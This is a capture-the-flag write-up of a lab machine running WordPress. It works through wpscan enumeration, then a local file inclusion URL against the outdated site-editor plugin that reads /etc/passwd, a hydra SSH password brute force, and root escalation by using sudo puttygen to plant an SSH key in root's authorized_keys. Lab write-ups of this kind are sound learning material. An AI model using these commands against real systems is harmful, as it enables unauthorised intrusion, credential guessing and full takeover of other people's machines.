# ENUMERATION


## OPEN PORTS

![Pasted image 20241031135702.png](../../IMAGES/Pasted%20image%2020241031135702.png)
2 open ports, one is a website and the other is ssh, let's fuzz the website

## FUZZING

![Pasted image 20241031135726.png](../../IMAGES/Pasted%20image%2020241031135726.png)

Seems like a WordPress page, let's take a look at it:


![Pasted image 20241031135814.png](../../IMAGES/Pasted%20image%2020241031135814.png)

First part seems off, let's look at the source code:

![Pasted image 20241031135908.png](../../IMAGES/Pasted%20image%2020241031135908.png)

Nothing too weird, let's save it in case we need it further, now, let's take a look at 
`wp-login.php`:

![Pasted image 20241031140023.png](../../IMAGES/Pasted%20image%2020241031140023.png)

We need to add `asucar.dl` to `/etc/hosts`:

![Pasted image 20241031140104.png](../../IMAGES/Pasted%20image%2020241031140104.png)


Knowing that the site uses WordPress, let's use `wpscan` to enumerate the website:


```ad-hint

##### USED COMMAND

`wpscan --url http://asucar.dl/ --random-user-agent`

##### OUTPUT

[+] URL: http://asucar.dl/ [172.17.0.2]
[+] Started: Thu Oct 31 19:12:55 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.59 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://asucar.dl/xmlrpc.php
 | Found By: Link Tag (Passive Detection)
 | Confidence: 100%
 | Confirmed By: Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://asucar.dl/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://asucar.dl/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://asucar.dl/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5.3 identified (Insecure, released on 2024-05-07).
 | Found By: Rss Generator (Passive Detection)
 |  - http://asucar.dl/index.php/feed/, <generator>https://wordpress.org/?v=6.5.3</generator>
 |  - http://asucar.dl/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.5.3</generator>

[+] WordPress theme in use: twentytwentyfour
 | Location: http://asucar.dl/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-07-16T00:00:00.000Z
 | Readme: http://asucar.dl/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.2
 | [!] Directory listing is enabled
 | Style URL: http://asucar.dl/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://asucar.dl/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] site-editor
 | Location: http://asucar.dl/wp-content/plugins/site-editor/
 | Last Updated: 2017-05-02T23:34:00.000Z
 | [!] The version is out of date, the latest version is 1.1.1
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://asucar.dl/wp-content/plugins/site-editor/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://asucar.dl/wp-content/plugins/site-editor/readme.txt
 


```

So, important info would be the following:

```ad-important

1. Apache/2.4.59 server(DEBIAN)
2. XML-RPC enabled and directory listing enabled for `http://asucar.dl/wp-content/uploads`
3. Site uses wordpress 6.5.3  with the `twentytwentyfour` theme.
4. `site-editor` plugin not updated running version 1.1
```


# EXPLOITATION


So, once we've enumerated all the info in the WordPress website, let's begin with exploitation, first, let's use `searchsploit` to lookup any exploit regarding that site editor version:

![Pasted image 20241031142025.png](../../IMAGES/Pasted%20image%2020241031142025.png)

Nice, we got a [LFI](../../Bug%20Bounty/Vulnerabilities/SERVER%20SIDE%20VULNERABILITIES/FILE%20INCLUSION%20VULNERABILITIES/LOCAL%20FILE%20INCLUSION%20(LFI).md)regarding this version, let's take a look at the exploit:

![Pasted image 20241031142212.png](../../IMAGES/Pasted%20image%2020241031142212.png)

So, the usage would be:

```ad-important

# USAGE

`http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd`

# asucar.dl exploitation:

`http://asucar.dl/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd`

```


Let's exploit it:

![Pasted image 20241031142325.png](../../IMAGES/Pasted%20image%2020241031142325.png)

Nice, we were able to execute the [LFI](../../Bug%20Bounty/Vulnerabilities/SERVER%20SIDE%20VULNERABILITIES/FILE%20INCLUSION%20VULNERABILITIES/LOCAL%20FILE%20INCLUSION%20(LFI).md), we found user `curiosito`

Let's use hydra and try to bruteforce the ssh login:


```ad-hint

##### USED COMMAND

`hydra -l curiosito -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10`

##### OUTPUT



```

Simple password, seems like the user didn't have that much security, let's log in to ssh:

![Pasted image 20241031142733.png](../../IMAGES/Pasted%20image%2020241031142733.png)

Nice, we can begin with PRIVESC




# PRIVILEGE ESCALATION



## SUDO -L

![Pasted image 20241031142756.png](../../IMAGES/Pasted%20image%2020241031142756.png)

We can run `puttygen`, `puttygen` is used to generate ssh keys, let's generate one for root user:

```ad-hint

##### USED


`puttygen -t rsa -b 2048 -O private-openssh -o ~/.ssh/hacked`

`puttygen -L ~/.ssh/hacked Â» ~/.ssh/authorized_keys`

`sudo puttygen /home/curiosito/.ssh/hacked -o /root/.ssh/hacked
`
`sudo puttygen /home/curiosito/.ssh/hacked -o /root/.ssh/authorized_keys -O public-openssh`

`ssh -i /home/curiosito/.ssh/hacked root@localhost`


##### OUTPUT



```



And that would be it for this CTF!

